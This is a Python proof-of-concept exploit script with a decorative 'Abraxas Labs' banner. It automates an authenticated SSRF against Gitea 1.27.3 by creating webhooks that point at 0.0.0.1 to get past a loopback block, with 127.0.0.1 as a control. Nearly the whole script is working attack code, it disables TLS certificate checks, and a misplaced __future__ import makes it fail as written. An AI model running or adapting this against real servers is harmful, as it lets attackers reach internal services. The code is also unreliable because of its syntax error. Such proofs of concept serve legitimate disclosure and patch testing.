#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: gitea-hostmatcher-0000-ssrf (High: 7.7)
#  Vendor: Gitea (Gitea)
#  Versions: Gitea <= 1.27.3
#  Impact: Authenticated SSRF (0.0.0.0/8 hostmatcher residual)
#  Requires: authenticated POST /api/v1/repos/{owner}/{repo}/hooks
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "gitea-hostmatcher-0000-ssrf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import json
import re
import ssl
import sys
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18131").rstrip("/")
WITNESS = "GITEA-0000-SSRF"
ORACLE_HIT = "http://0.0.0.1:8080/ssrf"
ORACLE_NEG = "http://127.0.0.1:8080/ssrf"
SUFFIX = uuid.uuid4().hex[:8]
USER = f"labuser{SUFFIX}"
PASSWORD = "LabPass123!"
EMAIL = f"{USER}@lab.local"
REPO = f"ssrf{SUFFIX}"
CTX = ssl._create_unverified_context()
JAR = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(JAR),
    urllib.request.HTTPSHandler(context=CTX),
)


def http_req(
    method: str,
    url: str,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: int = 30,
) -> tuple[int, str]:
    hdrs = {"User-Agent": "gitea-hostmatcher-0000-ssrf-lab"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with OPENER.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def csrf_from() -> str:
    for c in JAR:
        if c.name in ("_csrf", "_Csrf"):
            return c.value
    return ""


def form_post(path: str, fields: dict[str, str]) -> tuple[int, str]:
    token = csrf_from()
    if token:
        fields = dict(fields)
        fields["_csrf"] = token
    body = urllib.parse.urlencode(fields).encode()
    return http_req(
        "POST",
        BASE + path,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


def api(method: str, path: str, data: dict | None = None) -> tuple[int, str]:
    import base64

    basic = base64.b64encode(f"{USER}:{PASSWORD}".encode()).decode()
    hdrs = {
        "Content-Type": "application/json",
        "Authorization": "Basic " + basic,
    }
    body = None if data is None else json.dumps(data).encode()
    return http_req(method, BASE + path, data=body, headers=hdrs)


def register_or_login() -> None:
    s, page = http_req("GET", BASE + "/user/sign_up")
    print(f"IOC signup-get status={s} csrf={bool(csrf_from())}")
    s, b = form_post(
        "/user/sign_up",
        {
            "user_name": USER,
            "email": EMAIL,
            "password": PASSWORD,
            "retype": PASSWORD,
        },
    )
    print(f"IOC signup-post status={s} snippet={b[:160]!r}")
    s_me, b_me = api("GET", "/api/v1/user")
    if s_me == 200 and USER in b_me:
        print(f"IOC registered user={USER}")
        return
    s, page = http_req("GET", BASE + "/user/login")
    s, b = form_post("/user/login", {"user_name": USER, "password": PASSWORD})
    print(f"IOC login-post status={s} snippet={b[:120]!r}")
    s_me, b_me = api("GET", "/api/v1/user")
    print(f"IOC user status={s_me} snippet={b_me[:120]!r}")
    if s_me != 200:
        print("FAIL could not register or login")
        raise SystemExit(1)


def create_repo() -> None:
    s, b = api(
        "POST",
        "/api/v1/user/repos",
        {
            "name": REPO,
            "private": True,
            "auto_init": True,
            "readme": "Default",
            "default_branch": "main",
        },
    )
    print(f"IOC create-repo status={s} snippet={b[:180]!r}")
    if s not in (200, 201):
        print("FAIL create repo")
        raise SystemExit(1)
    for i in range(20):
        s, b = api("GET", f"/api/v1/repos/{USER}/{REPO}")
        if s == 200 and '"empty":false' in b.replace(" ", "").lower() or (s == 200 and '"empty": false' in b):
            print(f"IOC repo-ready i={i}")
            return
        # empty flag
        if s == 200:
            try:
                empty = json.loads(b).get("empty")
            except json.JSONDecodeError:
                empty = True
            if empty is False:
                print(f"IOC repo-ready i={i}")
                return
        time.sleep(1)
    print("FAIL repo never got an initial commit")
    raise SystemExit(1)


def create_hook(url: str, name: str) -> int:
    s, b = api(
        "POST",
        f"/api/v1/repos/{USER}/{REPO}/hooks",
        {
            "type": "gitea",
            "active": True,
            "events": ["push"],
            "name": name,
            "config": {"url": url, "content_type": "json", "http_method": "post"},
        },
    )
    print(f"IOC create-hook name={name} status={s} snippet={b[:220]!r}")
    if s not in (200, 201):
        print(f"FAIL create webhook {name}")
        raise SystemExit(1)
    hid = json.loads(b).get("id")
    if not hid:
        print("FAIL webhook id missing")
        raise SystemExit(1)
    return int(hid)


def test_hook(hid: int) -> None:
    s, b = api("POST", f"/api/v1/repos/{USER}/{REPO}/hooks/{hid}/tests")
    print(f"IOC test-hook id={hid} status={s} snippet={b[:160]!r}")
    if s not in (200, 204):
        print("FAIL test webhook")
        raise SystemExit(1)


def history_html(hid: int) -> str:
    s, b = http_req("GET", f"{BASE}/{USER}/{REPO}/settings/hooks/{hid}")
    print(f"IOC history-page id={hid} status={s} len={len(b)}")
    if s != 200:
        return ""
    return b


def wait_history(hid: int, expect_witness: bool) -> str:
    last = ""
    for i in range(24):
        last = history_html(hid)
        has = WITNESS in last
        deny = "deny" in last.lower() or "allowed HTTP servers" in last or "can only call allowed" in last
        print(f"IOC poll i={i} id={hid} witness={has} denyish={deny}")
        if expect_witness and has:
            return last
        if not expect_witness and (deny or ("Delivery:" in last and not has)):
            return last
        time.sleep(2)
    return last


def main() -> None:
    print(f"IOC base={BASE} user={USER} repo={REPO} hit={ORACLE_HIT} neg={ORACLE_NEG}")
    s, b = http_req("GET", BASE + "/api/v1/version")
    print(f"IOC version status={s} snippet={b[:120]!r}")
    if s != 200 or "1.27.3" not in b:
        print("FAIL unexpected Gitea version")
        raise SystemExit(1)

    register_or_login()
    create_repo()

    neg_id = create_hook(ORACLE_NEG, "neg-loopback")
    test_hook(neg_id)
    neg_html = wait_history(neg_id, expect_witness=False)
    if WITNESS in neg_html:
        print("FAIL 127.0.0.1 webhook was not blocked")
        raise SystemExit(1)
    if "deny" not in neg_html.lower() and "allowed HTTP servers" not in neg_html and "can only call allowed" not in neg_html:
        # still require a delivery record that is not success-with-witness
        if not neg_html:
            print("FAIL no negative-control history")
            raise SystemExit(1)
        print(f"IOC neg-history-snippet={neg_html[neg_html.find('webhook-info'):neg_html.find('webhook-info')+400] if 'webhook-info' in neg_html else neg_html[:400]!r}")
        if "200" in neg_html and "GITEA-0000-SSRF" in neg_html:
            print("FAIL 127.0.0.1 reached oracle")
            raise SystemExit(1)
    print("IOC negative-control 127.0.0.1 blocked")

    hit_id = create_hook(ORACLE_HIT, "hit-0000")
    test_hook(hit_id)
    hit_html = wait_history(hit_id, expect_witness=True)
    if WITNESS not in hit_html:
        print("FAIL 0.0.0.1 blocked like 127.0.0.1 (no witness in history)")
        raise SystemExit(1)
    print("SUCCESS GITEA-HOSTMATCHER-0000")


if __name__ == "__main__":
    main()

